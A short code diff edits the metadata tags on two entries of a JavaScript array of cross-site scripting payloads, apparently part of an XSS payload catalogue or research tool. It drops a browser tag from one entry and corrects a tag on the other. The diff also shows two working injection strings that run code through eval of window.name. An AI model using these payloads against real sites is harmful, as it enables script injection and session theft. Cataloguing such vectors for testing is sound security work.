@@ -72,7 +72,7 @@ const PAYLOADS = [
     },
     {
         html: "<style/onload=eval(name)>",
-        tags: [TAGS.chrome, TAGS.inlineStyleAllow, TAGS.controlsName, TAGS.unsafeEval],
+        tags: [TAGS.inlineStyleAllow, TAGS.controlsName, TAGS.unsafeEval],
         author: null
     },
     {
@@ -87,7 +87,7 @@ const PAYLOADS = [
     },
     {
         html: "<style/onerror=eval(name)>",
-        tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsURL, TAGS.inlineStyleBlock],
+        tags: [TAGS.unsafeEval, TAGS.unsafeInline, TAGS.controlsName, TAGS.inlineStyleBlock],
         author: null
     },
 ]
